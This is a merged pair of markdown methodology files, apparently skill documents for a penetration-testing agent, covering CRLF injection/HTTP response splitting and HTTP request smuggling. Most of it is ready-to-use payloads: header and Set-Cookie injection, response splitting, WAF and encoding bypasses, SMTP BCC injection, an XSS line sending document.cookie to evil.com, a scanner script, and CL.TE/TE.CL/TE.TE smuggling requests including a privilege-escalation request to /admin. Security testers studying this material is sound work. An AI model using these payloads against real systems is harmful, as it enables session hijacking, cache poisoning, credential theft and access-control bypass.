# MERGED SOURCE KNOWLEDGE: request-smuggling

94 unique sections from 2 source files. Each section appears in exactly one target.


## SOURCE: normal-skills/crlf-injection.md

name: crlf-injection
description: Comprehensive CRLF Injection (HTTP Response Splitting & Header Injection) testing methodology covering response splitting, header injection, cache poisoning, XSS via headers, SMTP injection, filter evasion with unicode variants, double-encoding, and optimized detection techniques for modern web stacks.
version: 1.0.0
---

## Overview

CRLF Injection (Carriage Return Line Feed Injection), also known as HTTP Response Splitting and HTTP Header Injection, is an attack technique that exploits applications failing to sanitize user input containing newline characters. By injecting `\r\n` (CRLF) sequences into HTTP headers, attackers can manipulate the HTTP response structure, inject arbitrary headers, split responses, poison caches, escalate to XSS, and in specific contexts achieve SMTP command injection.

**Core Mechanics:**
- **CRLF Sequence:** `\r\n` (0x0D 0x0A) terminates HTTP headers per RFC 7230
- **Response Splitting:** Injecting `\r\n\r\n` terminates the current response, allowing attacker-controlled body injection
- **Header Injection:** Appending `\r\n` followed by `Header-Name: value` injects arbitrary headers
- **Protocol Context:** HTTP/1.1, HTTP/2 (via downgrade), SMTP, email headers, log files

**Impact Severity Matrix:**
| Vector | Impact | Severity |
|--------|--------|----------|
| Response Splitting | XSS, cache poisoning, defacement | High |
| Set-Cookie Injection | Session fixation, account takeover | Critical |
| Location Header Injection | Open redirect, phishing | Medium-High |
| Cache-Control Poisoning | Persistent XSS, mass defacement | Critical |
| SMTP Header Injection | Email spoofing, phishing | High |

---

### 1.1 Initial Reconnaissance

Identify injection points where user input is reflected in HTTP response headers:

**Primary Injection Points:**
- URL parameters (`?redirect=`, `?next=`, `?return=`, `?url=`)
- Path segments (reflected in `Location`, `Content-Location`)
- Host headers (reflected in redirects, password reset links)
- Cookie values (reflected in Set-Cookie responses)
- Form inputs (reflected in custom headers like `X-User-Input`)
- Referer/Origin headers (logged or reflected)
- File upload filenames (reflected in `Content-Disposition`)
- API response headers (CORS, rate limiting headers)

**Header Reflection Analysis:**
```bash

# Identify headers reflecting user input
curl -I "https://target.com/redirect?url=testvalue" | grep -i "testvalue"
curl -I "https://target.com/" -H "X-Custom: injecttest" | grep -i "injecttest"
```

### 1.2 Basic Detection Payloads

Test for raw CRLF reflection in response headers:

```
%0d%0a
%0d%0aTestHeader: injected
%0aTestHeader: injected
%0dTestHeader: injected
%0d%0a%0d%0a<html><body>XSS</body></html>
```

**Verification Methodology:**
1. Send payload in each identified injection point
2. Inspect raw HTTP response (not just browser rendering)
3. Look for newly injected headers in the response
4. Check for response body content appearing prematurely

**Burp Suite Detection Regex:**
```regex
(?i)(?:Set-Cookie|Location|X-Frame-Options|Content-Type|Cache-Control|Last-Modified|X-Custom-Header):\s*[^\r\n]*[\r\n]
```

---

### 2.1 Core Payload Arsenal

**Basic CRLF Injection:**
```
%0d%0aSet-Cookie: session=hacked; Path=/
%0d%0aLocation: https://evil.com
%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0aContent-Length: 25%0d%0a%0d%0a<html>Hacked</html>
```

**Response Splitting (Full):**
```
%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0aContent-Length: 50%0d%0a%0d%0a<html><script>alert(1)</script></html>
```

**Header Continuation (HTTP/1.1 Folded Headers):**
```
%0d%0a%20Set-Cookie: admin=true
%0d%0a%09X-Injected: true
```

### 2.2 Encoding Variants Matrix

| Encoding | CRLF Representation | Use Case |
|----------|---------------------|----------|
| URL Encoding | `%0d%0a` | Standard web apps |
| Double URL Encoding | `%250d%250a` | WAFs, secondary decoding |
| Triple URL Encoding | `%25250d%25250a` | Deep nested decoding |
| Unicode UTF-8 | `%e5%98%8a%e5%98%8d` | Unicode normalization bypass |
| Unicode Fullwidth | `%ef%bc%8d%ef%bc%8d` | Fullwidth character bypass |
| HTML Entity | `&#13;&#10;` | HTML context injection |
| Hex Encoding | `0x0d0a` | Binary protocols |
| Mixed Case | `%0D%0A`, `%0D%0a` | Case-sensitive filters |
| Overlong UTF-8 | `%c0%8d%c0%8a` | UTF-8 security checks bypass |
| Bare LF | `%0a` | Unix-only systems |
| Bare CR | `%0d` | Legacy Mac systems |

### 2.3 Advanced Unicode & Alternative Newlines

**Unicode Line Terminators (Bypass strict `\r\n` filters):**
```
%u000a          # Unicode newline
%u000d          # Unicode carriage return
%u000d%u000a    # Unicode CRLF
\u000a          # JSON unicode escape
\u000d          # JSON unicode escape
\u000d\u000a    # JSON unicode CRLF
%C0%8A          # Overlong UTF-8 LF
%C0%8D          # Overlong UTF-8 CR
%E5%98%8A       # Unicode U+560A (alternative newline)
%E5%98%8D       # Unicode U+560D (alternative carriage return)
```

**HTML5 Entity Encoding:**
```
&#13;&#10;              # Decimal entities
&#x0d;&#x0a;            # Hex entities
&#013;&#010;            # Zero-padded decimal
&#xd;&#xa;              # Short hex
```

**JavaScript Unicode Escapes:**
```
\u000d\u000a
\x0d\x0a
```

### 2.4 Context-Specific Payloads

**Cookie Injection Context:**
```
%0d%0aSet-Cookie: admin=true; HttpOnly; Secure; Path=/
%0d%0aSet-Cookie: sessionid=STOLEN; Max-Age=999999
```

**Location Header Context:**
```
%0d%0aLocation: https://phishing-site.com/login
%0d%0aLocation: javascript:alert(1)
```

**Content-Type Injection (XSS Vector):**
```
%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(document.cookie)</script>
```

**Cache-Control Poisoning:**
```
%0d%0aLast-Modified: Mon, 01 Jan 2099 00:00:00 GMT
%0d%0aExpires: Mon, 01 Jan 2099 00:00:00 GMT
%0d%0aCache-Control: public, max-age=31536000
```

---

### 3.1 HTTP Response Splitting

**Objective:** Split the HTTP response to inject attacker-controlled body content.

**Prerequisites:**
- User input reflected in response headers (Location, Set-Cookie, etc.)
- No output encoding of `\r\n` sequences
- Proxy/server does not normalize or strip newlines

**Exploitation Chain:**
```
Original Request:
GET /redirect?url=value HTTP/1.1

Injected Request:
GET /redirect?url=%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>Hacked</html> HTTP/1.1

Result:
HTTP/1.1 302 Found
Location: 
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 35

<html>Hacked</html>HTTP/1.1 200 OK
...
```

**Modern Mitigation Bypass:**
HTTP/2 to HTTP/1.1 downgrade vulnerabilities in proxies:
```
:authority: target.com
:path: /redirect?url=%0d%0aSet-Cookie:%20hacked=1
```
HTTP/2 pseudo-headers may be translated to HTTP/1.1 headers without proper sanitization.

### 3.2 Header Injection Attacks

**Set-Cookie Injection (Session Fixation/Account Takeover):**
```
%0d%0aSet-Cookie: session=ATTACKER_CONTROLLED; Path=/; HttpOnly; Secure
%0d%0aSet-Cookie: admin=1; Path=/admin
```

**Security Header Stripping/Override:**
```
%0d%0aX-Frame-Options: ALLOWALL
%0d%0aContent-Security-Policy: default-src * 'unsafe-inline' 'unsafe-eval'
%0d%0aX-Content-Type-Options: nosniff
%0d%0aX-XSS-Protection: 0
```

**CORS Header Injection:**
```
%0d%0aAccess-Control-Allow-Origin: https://evil.com
%0d%0aAccess-Control-Allow-Credentials: true
```

### 3.3 Cache Poisoning via Header Injection

**Target Headers for Cache Poisoning:**
```
%0d%0aLast-Modified: Mon, 01 Jan 2099 00:00:00 GMT
%0d%0aCache-Control: public, max-age=31536000, immutable
%0d%0aExpires: Mon, 01 Jan 2099 00:00:00 GMT
```

**Exploitation Strategy:**
1. Inject cache-busting headers into a cached resource
2. Combine with response splitting to serve malicious content from cache
3. Poison shared caches (CDNs) for mass impact

**CDN-Specific Vectors:**
```
%0d%0aCF-Cache-Status: HIT
%0d%0aX-Cache: HIT
%0d%0aAge: 0
```

### 3.4 XSS via Header Injection

**Content-Type Manipulation:**
```
%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>fetch('https://evil.com/log?c='+document.cookie)</script>
```

**X-Content-Type-Options Bypass:**
```
%0d%0aX-Content-Type-Options: nosniff%0d%0aContent-Type: text/html
```

**CSP Bypass via Header Injection:**
```
%0d%0aContent-Security-Policy: default-src * 'unsafe-inline'
```

### 3.5 Email/SMTP Header Injection

**Context:** Applications sending email where user input becomes part of email headers (contact forms, registration, password reset).

**SMTP Command Injection:**
```
%0d%0aBCC: attacker@evil.com
%0d%0aCC: victim1@company.com,victim2@company.com
%0d%0aSubject: Hacked
%0d%0aContent-Type: text/html
%0d%0a%0d%0a<h1>Phishing Content</h1>
```

**Email Header Injection Payloads:**
```
From: victim@company.com%0d%0aBCC: attacker@evil.com
Subject: Password Reset%0d%0a%0d%0aNew password: hacked123
To: admin@company.com%0d%0aSubject: Urgent%0d%0a%0d%0aMalicious body
```

**MIME Boundary Injection:**
```
%0d%0aContent-Type: multipart/mixed; boundary=evil%0d%0a%0d%0a--evil%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>%0d%0a--evil--
```

---

### 4.1 Encoding Bypasses

**Double URL Encoding:**
```
%250d%250a
%25250d%25250a
```

**Mixed Encoding:**
```
%0d%250a
%250d%0a
```

**Unicode Normalization Bypass:**
```
%e5%98%8a%e5%98%8d    # Normalizes to \r\n in some contexts
%ef%bc%8d%ef%bc%8d    # Fullwidth hyphen (U+FF0D) - not newline but test
```

### 4.2 Alternative Newline Sequences

| Sequence | Bytes | Description |
|----------|-------|-------------|
| `\r\n` | `0D 0A` | Standard CRLF |
| `\n` | `0A` | Unix LF |
| `\r` | `0D` | Mac CR |
| `\u2028` | `E2 80 A8` | Unicode Line Separator |
| `\u2029` | `E2 80 A9` | Unicode Paragraph Separator |
| `\u0085` | `C2 85` | Unicode Next Line (NEL) |
| `\x0b` | `0B` | Vertical Tab |
| `\x0c` | `0C` | Form Feed |

**JSON Context:**
```json
{"redirect": "value\u000d\u000aSet-Cookie: hacked=1"}
```

### 4.3 HTTP/2 Specific Bypasses

**HTTP/2 Header Injection (H2.TE / H2.CL):**
```
:authority: target.com
:scheme: https
:method: GET
:path: /?url=%0d%0aSet-Cookie:%20hacked=1
```

**HTTP/2 Pseudo-Header Contamination:**
Inject into `:authority` or `:path` which may be concatenated into HTTP/1.1 headers during downgrade.

### 4.4 WAF Bypass Techniques

**Case Variation:**
```
%0D%0A
%0d%0A
%0D%0a
```

**Tab Character Substitution:**
```
%0d%0a%09Header: value    # Tab after CRLF for header continuation
%0d%0a%20Header: value    # Space after CRLF
```

**Comment Injection (Legacy):**
```
%0d%0aSet-Cookie: value; expires=Mon, 01-Jan-2099 %0d%0a%20 00:00:00 GMT
```

**Chunked Transfer Encoding Abuse:**
```
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
X-Injected: true\r\n
\r\n
```

---

### 5.1 Redirect Parameters

**Test Parameters:**
```
?next=
?return=
?redirect=
?url=
?return_to=
?redir=
?continue=
?dest=
?destination=
?go=
```

**Test Sequence:**
1. `%0d%0aTestHeader: injected` - Basic detection
2. `%0d%0aSet-Cookie: test=1` - Cookie injection
3. `%0d%0aLocation: https://evil.com` - Open redirect via header
4. `%0d%0a%0d%0a<script>alert(1)</script>` - Response splitting

### 5.2 Host Header Injection

**Test Scenarios:**
- Password reset functionality
- Email verification links
- 2FA code delivery
- Account invitation links

**Payloads:**
```
Host: target.com%0d%0aX-Forwarded-Host: evil.com
Host: target.com%0d%0aX-HTTP-Host-Override: evil.com
```

### 5.3 File Upload Filename Injection

**Content-Disposition Header Injection:**
```
filename="file.pdf%0d%0aContent-Type: text/html"
filename="file.pdf%0d%0a%0d%0a<script>alert(1)</script>"
```

### 5.4 API & JSON Contexts

**JSON Value Injection:**
```json
{
  "redirect_url": "https://target.com%0d%0aSet-Cookie: admin=1",
  "callback": "https://target.com%0d%0aLocation: https://evil.com"
}
```

**XML Injection:**
```xml
<redirect>https://target.com&#13;&#10;Set-Cookie: hacked=1</redirect>
```

---

### 6.1 Burp Suite Extensions & Configurations

**Match and Replace Rules:**
```
Match: ^(.*)$
Replace: $1%0d%0aX-CRLF-Test: 1
```

**Intruder Payload Positions:**
```
GET /redirect?url=§payload§ HTTP/1.1
```

**Payload List for Intruder:**
```
%0d%0a
%0a
%0d
%0d%0aSet-Cookie: test=1
%0d%0aLocation: https://evil.com
%250d%250a
%e5%98%8a%e5%98%8d
```

### 6.2 Custom Detection Scripts

**Python Detection Script:**
```python
import requests
import urllib.parse

TARGET = "https://target.com/redirect"
PARAM = "url"
PAYLOADS = [
    "%0d%0aX-CRLF-Test: 1",
    "%0aX-CRLF-Test: 1",
    "%0dX-CRLF-Test: 1",
    "%250d%250aX-CRLF-Test: 1",
    "%e5%98%8a%e5%98%8dX-CRLF-Test: 1"
]

def test_crlf(url, param, payload):
    test_url = f"{url}?{param}={payload}"
    try:
        r = requests.get(test_url, allow_redirects=False, timeout=10)
        headers = str(r.headers)
        if "X-CRLF-Test" in headers:
            print(f"[VULNERABLE] {payload}")
            print(f"  URL: {test_url}")
            return True
    except Exception as e:
        print(f"[ERROR] {e}")
    return False

for p in PAYLOADS:
    test_crlf(TARGET, PARAM, p)
```

### 6.3 Nuclei Templates

```yaml
id: crlf-injection

info:
  name: CRLF Injection Detection
  author: custom
  severity: medium
  description: Detects CRLF injection vulnerabilities

requests:
  - method: GET
    path:
      - "{{BaseURL}}/redirect?url=%0d%0aSet-Cookie:crlf=test"
    
    matchers:
      - type: regex
        part: header
        regex:
          - "(?i)Set-Cookie: crlf=test"
```

---

### 7.1 HTTP Request Smuggling + CRLF Injection

**H2.TE Smuggling with CRLF:**
```
POST / HTTP/2
Host: target.com
Content-Length: 0

GET /redirect?url=%0d%0aHTTP/1.1%20200%20OK HTTP/1.1
Host: target.com
```

### 7.2 SSRF to CRLF Injection Chains

**Gopher Protocol with CRLF:**
```
gopher://target.com:80/_GET%20/redirect?url=%0d%0aSet-Cookie:%20hacked=1%20HTTP/1.1%0d%0aHost:%20target.com%0d%0a%0d%0a
```

### 7.3 Log Injection to CRLF

**Log File Poisoning:**
```
User-Agent: Mozilla/5.0%0d%0a<script>alert(1)</script>
X-Forwarded-For: 127.0.0.1%0d%0aAdmin: true
```

### 7.4 PDF/Excel Header Injection

**Content-Disposition in File Downloads:**
```
?file=document.pdf%0d%0aContent-Type: text/html
```

---

### 8.1 Confirmation Checklist

- [ ] Raw response contains injected headers
- [ ] Browser/network tool confirms header presence
- [ ] Response splitting creates valid secondary response
- [ ] Cookie injection persists across requests
- [ ] Cache poisoning affects subsequent requests
- [ ] XSS payload executes in browser context

### 8.2 Safe Proof of Concept Payloads

**Non-Destructive Detection:**
```
%0d%0aX-CRLF-Detection: {{random_string}}
%0d%0aX-Bug-Bounty: {{researcher_identifier}}
```

**Cookie-Based Confirmation:**
```
%0d%0aSet-Cookie: crlf_detection={{random_string}}; Path=/
```

### 8.3 Browser Verification

```javascript
// Verify injected cookie
document.cookie.includes('crlf_detection=')

// Verify injected header via fetch
fetch('/').then(r => console.log(r.headers.get('X-CRLF-Detection')))
```

---

### 9.1 Common Defenses

| Defense | Bypass Technique |
|---------|------------------|
| Strip `\r\n` | Use alternative newlines (`\u2028`, `\u2029`) |
| URL decode once | Double encoding (`%250d%250a`) |
| Input validation | HTTP/2 smuggling, header continuation |
| Web Application Firewall | Unicode normalization, case variation |
| Header size limits | Split across multiple parameters |

### 9.2 Secure Coding Patterns

**Proper Sanitization (Python/Flask):**
```python
from werkzeug.http import dump_header
import re

def sanitize_header_value(value):
    # Remove all newline characters
    return re.sub(r'[\r\n]', '', value)
```

**Proper Sanitization (Node.js/Express):**
```javascript
function sanitizeHeader(value) {
    return value.replace(/[\r\n]/g, '');
}
```

---

### Vulnerability Report Structure

**Title:** CRLF Injection (HTTP Response Splitting) via [Parameter] in [Endpoint]

**Severity:** High / Critical (context-dependent)

**Description:**
The application fails to sanitize user-supplied input containing carriage return (`\r`, `%0d`) and line feed (`\n`, `%0a`) characters in the [parameter] parameter of the [endpoint] endpoint. This allows injection of arbitrary HTTP headers and response splitting.

**Affected Endpoint:**
```
[METHOD] [FULL_URL]
```

**Proof of Concept:**
```
[EXACT_REQUEST]
```

**Impact:**
- HTTP Response Splitting leading to XSS
- Session fixation via Set-Cookie injection
- Cache poisoning attacks
- Security header bypass

**Remediation:**
1. Strip `\r\n` from all user input reflected in headers
2. Use framework-provided redirect functions that validate URLs
3. Implement strict input validation using allowlists
4. Deploy Web Application Firewall with CRLF detection rules

**References:**
- CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection')
- OWASP: HTTP Response Splitting
- RFC 7230: HTTP/1.1 Message Syntax and Routing

---

# Header Injection
%0d%0aSet-Cookie: session=hacked
%0d%0aLocation: https://evil.com
%0d%0aX-Frame-Options: ALLOWALL

# Response Splitting
%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>

# Cache Poisoning
%0d%0aLast-Modified: Mon, 01 Jan 2099 00:00:00 GMT
%0d%0aCache-Control: public, max-age=31536000
```

---

## Appendix B: Testing Checklist

- [ ] Test all URL parameters for header reflection
- [ ] Test path segments in redirect endpoints
- [ ] Test Host header in password reset flows
- [ ] Test cookie values for Set-Cookie reflection
- [ ] Test file upload filenames
- [ ] Test JSON/XML API endpoints
- [ ] Test with bare LF (`%0a`) and bare CR (`%0d`)
- [ ] Test double-encoded variants
- [ ] Test Unicode newline alternatives
- [ ] Test HTTP/2 specific vectors
- [ ] Verify cache poisoning potential
- [ ] Verify XSS escalation potential
- [ ] Verify email header injection in mail functions
- [ ] Document all successful injection points
- [ ] Provide raw HTTP response evidence


## SOURCE: normal-skills/http-request-smuggling.md

name: http-request-smuggling
description: Comprehensive HTTP Request Smuggling testing methodology covering CL.TE desynchronization, TE.CL desynchronization, TE.TE header obfuscation, request tunnelling for access control bypass, and desync-powered attacks including SSRF, credential hijacking, and cache poisoning with optimized detection and exploitation techniques.
version: 1.0.0
---

## Overview

HTTP Request Smuggling (HRS) is an attack technique that exploits discrepancies in how front-end proxies, load balancers, CDNs, and back-end servers parse the boundaries of HTTP requests. By manipulating `Content-Length` (CL) and `Transfer-Encoding` (TE) headers—and their HTTP/2 analogues—an attacker can cause two adjacent HTTP servers to disagree on where one request ends and the next begins. This disagreement allows the attacker to "smuggle" a malicious request inside the body of an innocent-looking request, leading to request hijacking, cache poisoning, credential hijacking, and SSRF.

**HTTP Architecture Context:**
- **Content-Length (CL):** Decimal byte count of the request body. Used in HTTP/1.1 when body length is known.
- **Transfer-Encoding (TE):** `chunked` encoding splits the body into chunks prefixed with hex size. Terminated by a zero-length chunk (`0\r\n\r\n`).
- **RFC 7230 Clause:** If both CL and TE are present, TE must be preferred. However, many implementations ignore or mishandle this.
- **HTTP/2:** Uses frame-based streams with explicit DATA frame lengths. Downgrading HTTP/2 to HTTP/1.1 introduces translation vulnerabilities (H2.TE, H2.CL).
- **Connection Reuse:** HTTP/1.1 persistent connections (`Connection: keep-alive`) allow multiple requests per TCP connection, enabling smuggled requests to affect subsequent legitimate requests.

**Target Indicators:**
- Multi-tier architectures (CDN → WAF → Load Balancer → App Server)
- Mixed server technologies (e.g., nginx → Apache, CloudFront → Tomcat, HAProxy → Node.js)
- HTTP/2 enabled at the edge with HTTP/1.1 backend
- Endpoints accepting POST/PUT bodies with both CL and TE headers
- Responses revealing server composition via headers (`Server: nginx`, `Via: 1.1 varnish`, `X-Cache`)

---

### 1.1 Baseline Header Acceptance Testing

Determine how the front-end handles ambiguous or conflicting CL/TE headers.

**Test 1: TE Header Acceptance**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

**Analysis:**
- If the server hangs/times out → It processed TE and is waiting for the terminating `\r\n\r\n` after the zero chunk (or the `X` was treated as the start of the next request).
- If immediate response → It likely used CL=6 and ignored TE.

**Test 2: CL Header with TE Body**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

12
AAAAAAAAAAAAAAAA
0

```

**Analysis:**
- If immediate response with error or truncated body → Front-end used CL=4, read `12\r\n`, sent that to backend.
- If delay/timeout → Front-end processed TE and read all chunks.

### 1.2 Timeout-Based Desync Detection (CL.TE)

Send a request designed to cause the back-end to wait for more data while the front-end considers the connection ready for the next request.

**CL.TE Detection Payload:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Foo: bar
```

**Procedure:**
1. Send the above request.
2. Immediately send a follow-up innocent request on the same connection:
```http
GET / HTTP/1.1
Host: example.com
```

**Indicators of CL.TE Vulnerability:**
- The follow-up request receives a `404 Not Found` response (the smuggled `GET /404` was processed by the back-end).
- The follow-up request receives a `400 Bad Request` or connection reset (the back-end parsed the smuggled request headers and rejected them).
- Time delay: If the back-end uses TE, it waits for the `\r\n\r\n` after the zero chunk. The smuggled `GET /404...` is interpreted as the start of the next request, but incomplete. The follow-up request completes it, causing unexpected parsing.

### 1.3 Timeout-Based Desync Detection (TE.CL)

**TE.CL Detection Payload:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /404 HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

**Procedure:**
1. Send the above request. Note: `5c` (92 in hex) is the length of the smuggled request body including the `x=1` payload.
2. Immediately send a follow-up request on the same connection.

**Indicators of TE.CL Vulnerability:**
- The front-end processes TE and reads the `5c` chunk + `0` terminator. It forwards the entire request to the back-end.
- The back-end uses CL=4, reads only `5c\r\nG` (4 bytes), and treats the remainder (`ET /404...`) as the start of the next request.
- The follow-up request is processed after the smuggled `GET /404`, resulting in a 404 response to the follow-up.

### 1.4 Differential Response Analysis

Instead of relying on timeouts, use differential responses to confirm desync.

**CL.TE Confirming Payload:**
```http
POST /search HTTP/1.1
Host: example.com
Content-Length: 62
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: example.com
Content-Length: 15
Content-Type: application/x-www-form-urlencoded

q=smuggled
```

**Send twice on the same connection.** If the back-end is vulnerable to CL.TE:
- Request 1: Front-end sees TE, terminates at `0\r\n\r\n`. Back-end sees CL=62, reads the smuggled POST as part of Request 1's body.
- Request 2: Front-end sends it normally. Back-end processes the smuggled POST from Request 1's body, then processes Request 2.
- Response to Request 2 will be the result of the smuggled `q=smuggled` search (differential from normal).

**TE.CL Confirming Payload:**
```http
POST /search HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

87
POST /search HTTP/1.1
Host: example.com
Content-Length: 15
Content-Type: application/x-www-form-urlencoded

q=smuggled
0

```

**Send twice.** The back-end (using CL=4) will read `87\r\n` and leave the smuggled request in the buffer, processing it when the next request arrives.

### 1.5 HTTP/2 Downgrade Detection (H2.TE / H2.CL)

Test for HTTP/2 to HTTP/1.1 desync vulnerabilities.

**H2.TE Detection:**
```http

# HTTP/2 request (translated by frontend to HTTP/1.1)
:method: POST
:path: /
:scheme: https
:authority: example.com
content-length: 0
transfer-encoding: chunked

# Body (in HTTP/2 DATA frames)
0\r\n\r\n
GET /admin HTTP/1.1\r\n
Host: example.com\r\n
\r\n
```

**Indicator:** If the HTTP/2 frontend strips `transfer-encoding` but the backend processes it (due to re-adding during downgrade), or if the frontend forwards a crafted body containing chunked encoding that the backend interprets as TE.

**H2.CL Detection:**
```http

# HTTP/2 request
:method: POST
:path: /
:scheme: https
:authority: example.com
content-length: 4

# Body
AAAA
```

**Indicator:** If the frontend uses HTTP/2 DATA frame boundaries but the backend uses the `content-length` header, and an attacker can inject a fake `content-length` during downgrade.

---

### 2.1 Attack Mechanics

In a CL.TE vulnerability:
- **Front-end:** Uses `Content-Length` to determine where the request body ends.
- **Back-end:** Uses `Transfer-Encoding: chunked` to determine where the request body ends.

The front-end forwards the request body based on CL. The back-end parses the same bytes as chunked encoding, leaving trailing bytes in the TCP buffer that are interpreted as the start of the next request.

### 2.2 CL.TE Smuggling Payloads

**Basic CL.TE Smuggle:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: example.com
Foo: bar
```

**Mechanism:**
1. Front-end reads 50 bytes (including `0\r\n\r\nGET /admin...`).
2. Forwards all 50 bytes to the back-end.
3. Back-end parses TE, sees `0\r\n\r\n` (end of chunks).
4. Remaining bytes (`GET /admin HTTP/1.1\r\nHost: example.com\r\nFoo: bar`) are left in the TCP buffer.
5. Next request on the connection is appended to these bytes.
6. Back-end processes `GET /admin HTTP/1.1\r\nHost: example.com\r\nFoo: bar[Next Request]`.

**Optimized CL.TE Payload for Access Control Bypass:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /admin/upgrade-user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

user=attacker&role=admin
```

### 2.3 CL.TE with Chunked Extensions

Some parsers accept chunked extensions (ignored by spec but processed by lenient parsers), which can be used for obfuscation.

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 60
Transfer-Encoding: chunked

0;X=Y

GET /admin HTTP/1.1
Host: example.com
```

### 2.4 CL.TE Confirmation Techniques

**Technique A: Time Delay**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

1
A
0
```

If CL.TE: Front-end sends 4 bytes (`1\r\nA\r`). Back-end waits for the terminating `0\r\n\r\n` → **Timeout**.

**Technique B: Differential Response**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 55
Transfer-Encoding: chunked

0

GET /thispagedoesnotexist HTTP/1.1
Foo: bar
```

Send a follow-up `GET /`. If the follow-up receives 404, the smuggled request was processed.

---

### 3.1 Attack Mechanics

In a TE.CL vulnerability:
- **Front-end:** Uses `Transfer-Encoding: chunked` to determine where the request body ends.
- **Back-end:** Uses `Content-Length` to determine where the request body ends.

The front-end reads the entire chunked body (including the smuggled request). The back-end reads only the number of bytes specified by CL, leaving the remainder of the front-end's forwarded data in the buffer as the start of the next request.

### 3.2 TE.CL Smuggling Payloads

**Basic TE.CL Smuggle:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /admin HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

**Mechanism:**
1. Front-end parses TE. Reads chunk size `5e` (94 bytes). Reads 94 bytes of data. Reads `0\r\n\r\n` terminator. Forwards the entire request to the back-end.
2. Back-end reads CL=4 bytes (`5e\r\nP`).
3. Remaining bytes (`OST /admin HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n`) are left in the buffer.
4. Next request is appended to `OST /admin...` → Back-end processes the smuggled request.

**Critical Note:** The hex chunk size (`5e` above) must exactly equal the byte length of the smuggled request body (everything after the chunk size line up to but not including the final `0\r\n\r\n`).

**Accurate TE.CL Payload Construction:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

7b
POST /admin HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

Calculate `7b` (123) as the exact byte count of:
```
POST /admin HTTP/1.1\r\n
Host: example.com\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
```

### 3.3 TE.CL with Chunked Trailers

Some back-ends accept trailers after the final chunk, which can be abused to pad or obfuscate.

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /admin HTTP/1.1
Host: example.com
Content-Length: 15

x=1
0
X-Trailer: value

```

### 3.4 TE.CL Confirmation Techniques

**Technique A: Time Delay**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

If TE.CL: Front-end parses TE, terminates at `0\r\n\r\n`. Back-end reads CL=6 (`0\r\n\r\nX`). The `X` and subsequent data are treated as the next request, but incomplete → **Timeout** on next request.

**Technique B: Differential Response**
Use the same double-request technique as CL.TE, but with the TE.CL payload structure. The follow-up request should trigger the smuggled request's response.

---

### 4.1 Attack Mechanics

In a TE.TE vulnerability, both the front-end and back-end support `Transfer-Encoding: chunked`, but one of them can be tricked into NOT processing the header due to obfuscation. Once one server ignores TE, the desync reverts to either CL.TE or TE.CL behavior.

### 4.2 TE Obfuscation Techniques

The goal is to craft a `Transfer-Encoding` header that one parser recognizes and another ignores.

**Technique 1: Header Name Spacing**
```http
Transfer-Encoding : chunked
Transfer-Encoding\t: chunked
 Transfer-Encoding: chunked
```

**Technique 2: Header Value Spacing**
```http
Transfer-Encoding: chunked
Transfer-Encoding:  chunked
Transfer-Encoding:\tchunked
Transfer-Encoding:\n chunked
```

**Technique 3: Value Obfuscation**
```http
Transfer-Encoding: chunked
Transfer-Encoding: chunkedd
Transfer-Encoding: CHUNKED
Transfer-Encoding: 'chunked'
Transfer-Encoding: "chunked"
Transfer-Encoding: \x08chunked\x08
```

**Technique 4: Duplicate Conflicting Headers**
```http
Transfer-Encoding: chunked
Transfer-Encoding: identity
```

**Technique 5: Chunked with Unsupported Encodings**
```http
Transfer-Encoding: gzip, chunked
Transfer-Encoding: chunked, identity
```

**Technique 6: Header Character Set Obfuscation**
```http
Transfer-Encoding: chünked
Transfer-Encoding: chünked
Transfer-Encoding: \x00chunked
```

**Technique 7: Line Folding (Deprecated but supported)**
```http
Transfer-Encoding: chunked
\tboundary=something
```

### 4.3 TE.TE to CL.TE Conversion

If obfuscation causes the front-end to ignore TE (uses CL) while the back-end processes TE:

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 50
Transfer-Encoding: chünked

0

GET /admin HTTP/1.1
Host: example.com
```

